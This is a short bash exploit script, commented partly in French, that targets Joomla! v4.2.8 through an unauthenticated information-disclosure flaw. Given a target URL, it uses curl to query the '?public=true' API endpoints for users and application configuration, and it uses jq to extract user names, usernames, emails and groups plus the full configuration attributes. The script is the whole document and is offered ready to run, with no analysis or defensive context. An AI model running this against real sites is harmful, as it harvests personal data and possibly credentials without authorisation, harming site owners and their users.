!/bin/bash

# Exploit: Joomla! v4.2.8 - Unauthenticated information disclosure
# Remplacer par l'URL de base de votre cible Joomla!
BASE_URL="$1"


if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <url>"
    exit 1
fi


fetch_users() {
    curl -s "$BASE_URL/api/index.php/v1/users?public=true" | jq '.data[] | select(.type == "users") | {id: .attributes.id, name: .attributes.name, username: .attributes.username, email: .attributes.email, groups: .attributes.group_names}'
}


fetch_config() {
    curl -s "$BASE_URL/api/index.php/v1/config/application?public=true" | jq '.data[] | select(.type == "application") | .attributes'
}


echo "Users:"
fetch_users


echo "Configuration:"
fetch_config
